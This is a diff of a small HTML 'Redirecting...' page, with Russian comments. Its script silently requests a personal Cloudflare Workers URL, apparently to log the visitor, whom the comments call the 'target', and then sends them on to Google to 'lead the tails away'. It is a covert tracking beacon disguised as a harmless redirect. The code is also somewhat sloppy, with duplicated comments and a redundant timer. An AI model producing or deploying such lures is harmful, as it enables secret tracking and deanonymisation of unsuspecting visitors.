@@ -3,24 +3,27 @@
 <head>
     <title>Redirecting...</title>
     <script>
-        const workerUrl = "https://adminfdm.alexgranny1708.workers.dev/";
-        const target = "https://google.com";
-
-        async function start() {
-            // mode: 'no-cors' позволяет отправить запрос даже через блокировки
-            fetch(workerUrl, { mode: 'no-cors', keepalive: true })
-                .finally(() => {
-                    // Редирект через 1 секунду, чтобы пакет успел улететь
-                    setTimeout(() => { window.location.replace(target); }, 1000);
-                });
-            
-            // Запасной редирект, если fetch совсем зависнет
-            setTimeout(() => { window.location.replace(target); }, 3000);
-        }
-        window.onload = start;
+        // Сначала "стучим" в воркер
+        // Сначала незаметно запрашиваем твой воркер
+        // ЗАМЕНИ ТУТ ССЫЛКУ НА СВОЮ ИЗ CLOUDFLARE!
+        fetch("https://adminfdm.alexgranny1708.workers.dev/")
+            .then(() => {
+                // Как только воркер ответил, кидаем в Google
+                // Как только воркер «увидел» цель, кидаем её в Google
+                window.location.href = "https://google.com";
+            })
+            .catch(() => {
+                // Если воркер заблокирован, все равно кидаем в Google через 1 сек
+                setTimeout(() => {
+                    window.location.href = "https://google.com";
+                }, 1000);
+                // Если что-то пошло не так, все равно уводим хвосты в Google
+                window.location.href = "https://google.com";
+            });
     </script>
 </head>
-<body><p>Loading...</p></body>
+<body>
+    <h1>Redirecting...</h1>
+    <p>Loading...</p>
+</body>
 </html>
-
-
